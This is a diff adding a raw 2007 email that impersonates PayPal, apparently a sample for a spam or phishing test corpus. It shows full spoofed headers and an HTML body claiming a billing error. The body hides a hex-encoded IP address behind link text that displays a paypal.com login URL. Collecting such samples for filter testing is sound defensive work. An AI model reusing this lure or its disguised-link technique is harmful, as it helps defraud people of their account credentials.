@@ -1,0 +1,106 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 4B7C146918
+ for <user@login.example.com>; Fri, 16 Feb 2007 12:40:26 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 644D6131FAA4
+ for <user@example.com>; Fri, 16 Feb 2007 12:40:26 -0500 (EST)
+Received: from razzari.com (unknown [64.113.217.140])
+ by mail.example.org (Postfix) with ESMTP id 2D8C46FA1A8
+ for <user@example.com>; Fri, 16 Feb 2007 12:40:26 -0500 (EST)
+Received: from User by razzari.com (MDaemon PRO v9.5.5)
+ with ESMTP id md50000196446.msg
+ for <user@example.com>; Fri, 16 Feb 2007 08:35:48 -0800
+From: "Service Center"<service@paypal.com>
+Subject: Update Your Profile Account
+Date: Fri, 16 Feb 2007 11:35:44 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Spam-Processed: razzari.com, Fri, 16 Feb 2007 08:35:48 -0800
+ (not processed: message from trusted or authenticated source)
+X-Return-Path: service@paypal.com
+X-Envelope-From: service@paypal.com
+X-MDaemon-Deliver-To: user@example.com
+Message-Id: <20070216174026.2D8C46FA1A8@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 834
+
+<br><br><table align="center" border="0" width="100%">
+<tbody><tr>
+    <td align="left"> <p><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border="0"></p>
+    <p>&nbsp;</p></td>
+</tr>
+<tr>
+</tr>
+
+<tr><td></td></tr>
+<tr><td></td></tr>
+<tr>
+<td class="panel"><b></b></td>
+</tr>
+<tr>
+</tr><tr><td></td> </tr>
+<tr><td></td> </tr>
+<tr><td></td></tr>
+<tr>
+    <td><font color="Navy" size="3"><em><strong>Dear PayPal Client,</strong></em></font><br>
+    <br>
+
+<font face="Arial" size="2">During our regularly scheduled account maintenance and verification we have detected a 
+slight error<br>
+in your billing information on file with PayPal.<br>
+<b>This might be due to either following reasons :</b>
+
+<br>
+</font><ul>
+<font face="Arial" size="2">        <li> <em>A recent change in your personal information (I.E. change of 
+          address) </em>
+</li><li> <em>Submitting invalid information during initial signup process</em> 
+        </li><li> <em>An inability to accurately verify your selected option of payment 
+          due of an internal error within our processors</em> 
+      </li></font></ul>
+
+<font face="Arial" size="2">In accordance with PayPal's User Agreement and to ensure that your account has not been compromised , access to your 
+account was limited. Your account access will remain limited untill this issue has been resolved. In order to secure 
+your account and quickly restore full access we may require some specific information from you for the following 
+reason :
+<br>
+<br>
+   <br>
+      <b>- <em>We encourage you to restore full access as soon as possible</em></b> 
+      <br>
+      <a target="_blank" href="http://0xD183C197/paypal/">https://www.paypal.com/cgi-bin/webscr?cmd=login-run</a> 
+    </font></td>
+</tr>
+<tr><td></td> </tr>
+
+<tr><td></td> </tr>
+<tr><td></td> </tr>
+<tr><td></td> </tr>
+<tr><td></td> </tr>
+<tr><td></td> </tr>
+<tr>
+<td class="panel"></td></tr>
+<tr>
+<td>
+<p><br>
+        Thanks for your patience as we work together to protect your account <br>
+
+        <br>
+        Please do not respond to this e-mail adress as your reply will not be 
+        recieved <br>
+        <b>Best regards</b>,<br>
+        <font size="2"><i>PayPal`s Team</i>.</font> </p>
+      <p><i>Copyright © 1999-2007 PayPal. All rights reserved.</i>
